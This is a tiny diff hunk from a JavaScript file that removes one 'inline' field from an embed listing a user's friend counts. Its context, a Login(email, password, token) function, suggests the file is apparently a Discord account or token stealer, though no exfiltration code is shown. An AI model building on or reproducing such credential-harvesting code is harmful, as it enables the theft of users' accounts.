@@ -193,7 +193,6 @@ function Login(email, password, token) {
                             {
                                 "name": "**Amis**",
                                 "value": `Tout les amis:\n\n (${totalFriends()})\n\n Les amis rare: ${CalcFriends()}`,
-                                "inline": false
                             }
                         ],
                         "author": {
